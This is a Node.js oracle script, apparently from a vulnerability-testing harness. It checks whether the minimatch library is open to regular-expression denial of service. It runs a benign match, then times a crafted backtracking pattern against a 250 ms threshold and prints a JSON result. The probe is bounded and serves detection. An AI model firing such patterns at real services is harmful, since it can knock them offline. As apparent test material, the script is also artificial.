const path = require('node:path');
const os = require('node:os');
const fs = require('node:fs');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function finish() {
  const result = { operation_completed, exploit_succeeded, evidence };
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

try {
  const minimatch = require('minimatch');

  // Setup marker in /tmp only
  const markerDir = path.join(os.tmpdir(), 'oracle-minimatch-redos-' + process.pid + '-' + Date.now());
  fs.mkdirSync(markerDir, { recursive: true });

  // Benign operation: prove library works normally first
  const benignPattern = '*.js';
  const benignTarget = 'index.js';
  const benignResult = minimatch(benignTarget, benignPattern);
  if (benignResult !== true) {
    throw new Error('Benign minimatch call failed: expected true, got ' + String(benignResult));
  }

  operation_completed = true;

  // ReDoS probe: crafted extglob pattern known to trigger heavy backtracking in vulnerable versions.
  // Keep bounded so it finishes quickly in vulnerable builds.
  const repeats = 26;
  const maliciousPattern = '(' + 'a|'.repeat(repeats) + 'a)' + '{' + repeats + '}Z';
  const maliciousInput = 'a'.repeat(repeats * 2);

  const t0 = process.hrtime.bigint();
  let matchResult;
  try {
    matchResult = minimatch(maliciousInput, maliciousPattern);
  } catch (err) {
    // If patched code rejects/throws on malicious pattern, treat as blocked after successful benign op.
    exploit_succeeded = false;
    evidence = 'benign_ok; malicious_threw=' + (err && err.message ? err.message : String(err));
    finish();
    process.exit(0);
  }
  const elapsedMs = Number(process.hrtime.bigint() - t0) / 1e6;

  // Threshold chosen to distinguish pathological slowdown while staying bounded.
  // Vulnerable builds should take noticeably longer; patched builds should stay fast.
  const thresholdMs = 250;
  exploit_succeeded = elapsedMs > thresholdMs;
  evidence = 'benign_ok; malicious_elapsed_ms=' + elapsedMs.toFixed(3) + '; threshold_ms=' + thresholdMs + '; match_result=' + String(matchResult);
} catch (err) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup_or_benign_failure=' + (err && err.message ? err.message : String(err));
}

finish();
